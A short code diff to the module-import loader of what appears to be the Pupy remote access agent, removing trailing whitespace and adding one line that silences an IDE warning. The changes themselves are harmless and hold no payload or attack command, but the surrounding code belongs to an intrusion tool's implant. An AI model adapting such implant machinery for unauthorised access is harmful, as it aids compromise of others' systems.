@@ -646,7 +646,7 @@ class PupyPackageFinder(_bootstrap_external._LoaderBasics):
 
         if self._is_already_loaded(fullname):
             return None
-        
+
         from pupy.agent.utils import pupy_add_package, safe_obtain
 
         if PupyPackageFinder.search_lock is not None:
@@ -857,7 +857,7 @@ def load_pupyimporter(stdlib=None):
     sys.path_importer_cache.clear()
 
     PupyPackageFinder.init_search_lock()
-    
+
     if is_native():
         # fixup some modules that were not imported correctly during bootstrap
         # TODO: investigate a cleaner way
@@ -865,6 +865,7 @@ def load_pupyimporter(stdlib=None):
         del sys.modules["collections.abc"]
         import collections.abc
         import collections
+        collections # use collections to ignore an IDE warning
 
     if sys.platform == 'win32':
         initialize_basic_windows_modules()
